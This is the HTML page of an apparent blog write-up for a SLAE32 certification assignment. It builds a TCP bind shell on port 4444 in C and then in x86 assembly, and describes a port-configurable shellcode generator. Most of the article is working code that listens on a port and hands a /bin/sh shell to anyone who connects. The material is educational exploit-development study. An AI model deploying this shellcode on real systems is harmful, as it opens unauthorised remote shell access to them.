@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> SLAE32 - Assignment 1 - TCP Bind Shell | Andrea Perfetti</title>
+  <meta name="description" content="YHQL, YLGL, YLFL.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="SLAE32 - Assignment 1 - TCP Bind Shell" />
+<meta property="og:description" content="The sixth assigment for the SLAE32 certification asks to write a TCP Bind Shell shellcode that binds to a port and then executes a shell on the incoming connection. Requirement is that port number should be easily configurable.
+TCP Bind Shell in C Let&rsquo;s first of all create a TCP bind shell in C that listens to port 4444. This is the code:
+#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;unistd.h&gt; int main (){ // Creating File Descriptor for the Socket		int socket_fd; socket_fd = socket(AF_INET, SOCK_STREAM, 0); // Binding the socket to server address 	struct sockaddr_in server_address; server_address." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://andrea-perfetti.github.io/posts/slae32-exam/2021-03-14-slae32-assignment-1/" />
+<meta property="article:published_time" content="2021-03-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-14T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE32 - Assignment 1 - TCP Bind Shell"/>
+<meta name="twitter:description" content="The sixth assigment for the SLAE32 certification asks to write a TCP Bind Shell shellcode that binds to a port and then executes a shell on the incoming connection. Requirement is that port number should be easily configurable.
+TCP Bind Shell in C Let&rsquo;s first of all create a TCP bind shell in C that listens to port 4444. This is the code:
+#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;unistd.h&gt; int main (){ // Creating File Descriptor for the Socket		int socket_fd; socket_fd = socket(AF_INET, SOCK_STREAM, 0); // Binding the socket to server address 	struct sockaddr_in server_address; server_address."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://andrea-perfetti.github.io/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://andrea-perfetti.github.io/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="https://www.andreaperfetti.it/">About me</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://andrea-perfetti.github.io/posts/slae32-exam/2021-03-14-slae32-assignment-5/">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&text=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&is_video=false&description=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell&body=Check out this article: https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-digg " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&name=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell&description=The%20sixth%20assigment%20for%20the%20SLAE32%20certification%20asks%20to%20write%20a%20TCP%20Bind%20Shell%20shellcode%20that%20binds%20to%20a%20port%20and%20then%20executes%20a%20shell%20on%20the%20incoming%20connection.%20Requirement%20is%20that%20port%20number%20should%20be%20easily%20configurable.%0aTCP%20Bind%20Shell%20in%20C%20Let%26rsquo%3bs%20first%20of%20all%20create%20a%20TCP%20bind%20shell%20in%20C%20that%20listens%20to%20port%204444.%20This%20is%20the%20code%3a%0a%23include%20%26lt%3bstdio.h%26gt%3b%23include%20%26lt%3bsys%2fsocket.h%26gt%3b%23include%20%26lt%3bnetinet%2fip.h%26gt%3b%23include%20%26lt%3bunistd.h%26gt%3b%20int%20main%20%28%29%7b%20%2f%2f%20Creating%20File%20Descriptor%20for%20the%20Socket%09%09int%20socket_fd%3b%20socket_fd%20%3d%20socket%28AF_INET%2c%20SOCK_STREAM%2c%200%29%3b%20%2f%2f%20Binding%20the%20socket%20to%20server%20address%20%09struct%20sockaddr_in%20server_address%3b%20server_address.">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&t=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tcp-bind-shell-in-c">TCP Bind Shell in C</a></li>
+    <li><a href="#porting-the-c-code-to-assembly">Porting the C code to Assembly</a>
+      <ul>
+        <li><a href="#socket">socket()</a></li>
+        <li><a href="#bind">bind()</a></li>
+        <li><a href="#listen">listen()</a></li>
+        <li><a href="#accept">accept()</a></li>
+        <li><a href="#dup2">dup2()</a></li>
+        <li><a href="#execve">execve()</a></li>
+        <li><a href="#exit">exit()</a></li>
+        <li><a href="#test-run">Test run</a></li>
+      </ul>
+    </li>
+    <li><a href="#port-configuration-utility">Port configuration utility</a></li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        SLAE32 - Assignment 1 - TCP Bind Shell
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2021-03-14 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-03-14</time>
+          
+        </div>
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/slae32-exam-assignments">SLAE32 Exam Assignments</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/slae32" rel="tag">SLAE32</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <p>The sixth assigment for the SLAE32 certification asks to write a TCP Bind Shell shellcode that binds to a port and then executes a shell on the incoming connection. Requirement is that port number should be easily configurable.</p>
+<h2 id="tcp-bind-shell-in-c">TCP Bind Shell in C</h2>
+<p>Let&rsquo;s first of all create a TCP bind shell in C that listens to port 4444. This is the code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/ip.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> (){
+
+	<span style="color:#75715e">// Creating File Descriptor for the Socket	
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> socket_fd;
+	socket_fd <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#75715e">// Binding the socket to server address
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sockaddr_in server_address; 
+	server_address.sin_family <span style="color:#f92672">=</span> AF_INET;
+	server_address.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">4444</span>);
+	server_address.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;
+
+	bind(socket_fd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_address, <span style="color:#66d9ef">sizeof</span>(server_address)); 
+
+	<span style="color:#75715e">// Activate listening on the socked
+</span><span style="color:#75715e"></span>	listen(socket_fd, <span style="color:#ae81ff">0</span>); 
+
+	<span style="color:#75715e">// Accept new connections on the socket
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> connection_fd;
+	connection_fd <span style="color:#f92672">=</span> accept(socket_fd, NULL, NULL);
+
+	<span style="color:#75715e">// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
+</span><span style="color:#75715e"></span>	dup2(connection_fd, <span style="color:#ae81ff">0</span>); 
+	dup2(connection_fd, <span style="color:#ae81ff">1</span>);
+	dup2(connection_fd, <span style="color:#ae81ff">2</span>);
+
+	<span style="color:#75715e">// Invoking EXECVE
+</span><span style="color:#75715e"></span>	execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
+
+	<span style="color:#75715e">// Return
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Trying the shell, we see that it is working as intended:
+<img src="/img/slae/slae1-01.png" alt="Bind Shell skeleton in C"></p>
+<h2 id="porting-the-c-code-to-assembly">Porting the C code to Assembly</h2>
+<p>Now, we need to port the C code into Assembly code. Basically, we need to replicate the following syscalls:</p>
+<ul>
+<li><a href="https://man7.org/linux/man-pages/man2/socket.2.html">socket</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/bind.2.html">bind</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/listen.2.html">listen</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/accept.2.html">accept</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/dup.2.html">dup2</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/execve.2.html">execve</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/exit.2.html">exit</a></li>
+</ul>
+<p>In the <code>Bind-Shell-StaticParams.nasm</code> file the original C lines have been kept to provide references and make it more readable at a first glance.</p>
+<p>Let&rsquo;s start and set the registers to zero:</p>
+<pre><code>; Zeroing the registers	
+xor eax, eax
+xor ebx, ebx
+xor ecx, ecx
+xor edx, edx
+</code></pre><h3 id="socket">socket()</h3>
+<p>The <code>socket()</code> function (syscall 359) creates an endpoint for communication. The prototype for this function is defined as follows:</p>
+<pre><code>int socket(int domain, int type, int protocol);
+</code></pre><p>The parameters need to be put in appropriate registers:</p>
+<ul>
+<li>ebx will contain <em>domain</em>, set to 2 for &ldquo;AF_INET&rdquo; (IPv4 Internet protocols)</li>
+<li>ecx will contain <em>type</em>, set to 1 for &ldquo;SOCK_STREAM&rdquo; (sequenced, reliable, two-way, connection-based byte streams)</li>
+<li>edx will contain <em>protocol</em>, set to 0 (single protocol)</li>
+</ul>
+<p>Code implementation is the following:</p>
+<pre><code>;// Creating File Descriptor for the Socket	
+;socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+mov ax, 0x167		; #define __NR_socket 359
+mov bl, 0x2			; AF_INET = 2
+mov cl, 0x1			; SOCK_STREAM = 1
+int 0x80			; FD will be stored in eax
+</code></pre><p>The return value of the function is the file descriptor that refers to the communication endpoint that has been created, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into edi.</p>
+<pre><code>mov edi, eax		; Copying socket_fd into edi
+xor eax, eax		; Cleaning eax
+</code></pre><h3 id="bind">bind()</h3>
+<p>The <code>bind()</code> function (syscall 361) binds a name to a socket. The prototype for this function is defined as follows:</p>
+<pre><code>int bind(int sockfd, const struct sockaddr *addr,
+         socklen_t addrlen);
+</code></pre><p>In order to execute the <em>bind</em> we will need to create the <em>sockaddr_in</em> structure in memory which will then be passed to the bind. The <em>sockaddr_in</em> prototype is defined as follows:</p>
+<pre><code>struct sockaddr_in {
+   short int            sin_family;
+   unsigned short int   sin_port;
+   struct in_addr       sin_addr;
+   unsigned char        sin_zero[8];
+};
+</code></pre><p>As we will need to provide also the lenght of the structure in memory, let&rsquo;s first save the current esp into edx:</p>
+<pre><code>;// Binding the socket to server address
+;struct sockaddr_in server_address; 
+mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)
+</code></pre><p>We need now to push the attributes of sockaddr_in onto the stack <em>in reverse order</em>, therefore we are:</p>
+<ul>
+<li>
+<p>Pushing 8 bytes set to zero and then push the listen address 0.0.0.0 (another 4 zero bytes):</p>
+<pre><code>;server_address.sin_addr.s_addr = INADDR_ANY;
+  push eax	
+  push eax
+  push eax		; Push 0x0 (INADDR_ANY)
+</code></pre></li>
+<li>
+<p>Pushing the port to bind. We are using port 4444 which is 0x115c Hex. Let&rsquo;s not forget we are using little-endian system, therefore we will push 0x5c11:</p>
+<pre><code>  ;server_address.sin_port = htons(4444);
+  push word 0x5c11	; DEC 4444 -&gt; HEX 0x115c 
+</code></pre></li>
+<li>
+<p>Pushing <em>sin_family</em> argument, which is 2 for AF_INET:</p>
+<pre><code>  ;server_address.sin_family = AF_INET;
+  push word 0x02		; AF_INET = 2
+</code></pre></li>
+</ul>
+<p>Now that we have created the <em>sockaddr_in</em> structure in memory we can populate the registers with parameters for the bind() syscall:</p>
+<ul>
+<li>eax is set to 0x169 (DEC 361 which is the syscall number)</li>
+<li>ebx is set with the file descriptor from socket() syscall (stored in edi)</li>
+<li>ecx is set to pointer to the structure in memory (top of the Stack)</li>
+<li>edx, which was set to the top of the stack before creating the <em>sockaddr_in</em> structure in memory, is now set to the actual size of the structure by subtracting the new address of the top of the Stack.</li>
+</ul>
+<pre><code>;bind(socket_fd, (struct sockaddr *)&amp;server_address, sizeof(server_address)); 
+mov ax, 0x0169		; #define __NR_bind 361
+mov ebx, edi		; ebx = socket_fd
+mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
+sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
+int 0x80
+</code></pre><h3 id="listen">listen()</h3>
+<p>The <code>listen()</code> function (syscall 363) listen for connections on a socket. The prototype for this function is defined as follows:</p>
+<pre><code>int listen(int sockfd, int backlog);
+</code></pre><p>The parameters need to be put in appropriate registers:</p>
+<ul>
+<li>ebx is set with the file descriptor from socket() syscall (stored in edi)</li>
+<li>ecx it set to 0 for the <em>backlog</em> parameter</li>
+</ul>
+<pre><code>;// Activate listening on the socked
+;listen(socket_fd, 0); 
+xor eax, eax		; eax = 0
+mov ax, 0x016b		; #define __NR_listen 363
+mov ebx, edi		; ebx = socket_fd
+xor ecx, ecx		; ecx = 0
+int 0x80
+</code></pre><h3 id="accept">accept()</h3>
+<p>The <code>accept()</code> function (syscall 364) accepts a connection on a socket. The prototype for this function is defined as follows:</p>
+<pre><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+</code></pre><p>The parameters need to be put in appropriate registers:</p>
+<ul>
+<li>ebx is set with the file descriptor from socket() syscall (stored in edi)</li>
+<li>ecx is set to 0 for the <em>addr</em> parameter, not to store details of the peer socket</li>
+<li>edx is set to 0 in alignment with choice for <em>addr</em> parameter (<em>When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL</em>)</li>
+</ul>
+<pre><code>;// Accept new connections on the socket
+;int connection_fd;
+;connection_fd = accept(socket_fd, NULL, NULL);
+xor eax, eax		; eax = 0
+mov ax, 0x16C		; #define __NR_accept4 364
+mov ebx, edi		; ebx = socket_fd
+xor ecx, ecx		; ecx = 0
+xor edx, edx		; edx = 0
+int 0x80		; connection_fd will be stored in eax
+</code></pre><p>The return value of the function is a new file descriptor that refers to the first connection request on the queue of pending connections for the listening socket, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into esi.</p>
+<pre><code>mov esi, eax		; esi = connection_fd
+</code></pre><h3 id="dup2">dup2()</h3>
+<p>The <code>dup2()</code> function (syscall 63) duplicates a file descriptor. The prototype for this function is defined as follows:</p>
+<pre><code>int dup2(int oldfd, int newfd);
+</code></pre><p>We need to execute this syscall 3 times, to duplicate the 3 file descriptors (STDIN, STDOUT and STDERR) to the file descriptor related to the connection socket created in the previous syscall and stored in esi.</p>
+<p>Given that we need to perform the same action 3 times, we are then using a loop with ecx as both counter and argument pointing to the 3 standard file descriptors:</p>
+<pre><code>	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
+	;dup2(connection_fd, 0); 
+	;dup2(connection_fd, 1);
+	;dup2(connection_fd, 2);
+
+	xor ecx, ecx		; ecx = 0
+	mov cl, 0x3		; will need to loop 3 times. 	
+_dup_loop:
+	xor eax, eax
+	mov al, 0x3f		; #define __NR_dup2 63
+	mov ebx, esi		; ebx = connection_fd
+	dec cl			; decrease ecx to get actual FD
+	int 0x80
+	jnz _dup_loop
+</code></pre><h3 id="execve">execve()</h3>
+<p>The <code>dup2()</code> function (syscall 11) executes a program. The prototype for this function is defined as follows:</p>
+<pre><code>int execve(const char *pathname, char *const argv[],
+           char *const envp[]);
+</code></pre><p>We will use it in order to start <code>/bin//sh</code> (additional &lsquo;/&rsquo; is not affecting the command, it has just been added for padding purposes), therefore we need to push it (along with NULL terminator) on the stack. Argument <em>envp</em> (edx) will be a pointer to a null dword and <em>argv</em> (ecx) will be a pointer to the address of <em>pathname</em></p>
+<pre><code>;// Invoking EXECVE
+;execve(&quot;/bin/sh&quot;, NULL, NULL);
+xor eax, eax		; eax = 0
+
+push eax		; push eax (0x0 as null terminator)
+push 0x68732f2f
+push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
+mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')
+
+push eax		; push 0x0
+mov edx, esp		; edx = pointer to TOS (null)
+
+push ebx		; push ebx (pointer to string '/bin//sh')
+mov ecx, esp		; ecx = pointer to TOS
+
+mov al, 0x0b		; #define __NR_execve 11
+int 0x80
+</code></pre><h3 id="exit">exit()</h3>
+<p>The exit function is very simple and known, its code (which needs to be set into eax) is 1. This is the code used to replicate it in our Assembly code:</p>
+<pre><code>	;// Return
+	;return 0;
+	xor eax, eax
+	xor ebx, ebx
+	inc eax
+	int 0x80
+</code></pre><h3 id="test-run">Test run</h3>
+<p>The Assembly code has been compiled and executed; it worked as intended!
+<img src="/img/slae/slae1-02.png" alt="Bind Shell skeleton in Assembly"></p>
+<h2 id="port-configuration-utility">Port configuration utility</h2>
+<p>As of now, the bind port has been hardcoded into the code, but the assignment asks for an &lsquo;easy-configurable port&rsquo;, therefore I have created a small Python3 script which generates the complete shellcode.</p>
+<p>I have generated the shellcode from the compiled nasm file and divided it into two parts (the shellcode before port bytes and the shellcode after port bytes). The <code>Bind-Shell-Creator.py</code> Python script requires a parameter that is the desired port number. It then transforms the port in the appropriate <em>socket</em> format and then prints on the screen:</p>
+<ul>
+<li>the selected port in Hex</li>
+<li>the selected port in reversed-Hex (ready for a push on the stack)</li>
+<li>the complete shellcode with the selected port</li>
+</ul>
+<p><img src="/img/slae/slae1-03.png" alt="Bind Shell skeleton in C"></p>
+<p>In order to test the script, I have first loaded the generated shellcode into a copy of the encrypter utility from Assignment 7 and encrypted it with password &lsquo;testme&rsquo;:
+<img src="/img/slae/slae1-04.png" alt="Bind Shell skeleton in C"></p>
+<p>The encrypted string has been copied to the decrypt-exec utility and then executed. As shown in the screenshot, the selected port (8080) has been applied and the shell has executed successfully:
+<img src="/img/slae/slae1-05.png" alt="Bind Shell skeleton in C"></p>
+<!-- raw HTML omitted -->
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>.</p>
+<p><strong>Student ID</strong>: <code>SLAE - 1547</code><br>
+<strong>GitHub repository</strong>: <a href="https://github.com/andrea-perfetti/SLAE32-Exam">https://github.com/andrea-perfetti/SLAE32-Exam</a></p>
+<p>This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ uname -a 
+Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
+</code></pre>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="https://www.andreaperfetti.it/">About me</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tcp-bind-shell-in-c">TCP Bind Shell in C</a></li>
+    <li><a href="#porting-the-c-code-to-assembly">Porting the C code to Assembly</a>
+      <ul>
+        <li><a href="#socket">socket()</a></li>
+        <li><a href="#bind">bind()</a></li>
+        <li><a href="#listen">listen()</a></li>
+        <li><a href="#accept">accept()</a></li>
+        <li><a href="#dup2">dup2()</a></li>
+        <li><a href="#execve">execve()</a></li>
+        <li><a href="#exit">exit()</a></li>
+        <li><a href="#test-run">Test run</a></li>
+      </ul>
+    </li>
+    <li><a href="#port-configuration-utility">Port configuration utility</a></li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&text=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&is_video=false&description=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell&body=Check out this article: https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&title=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
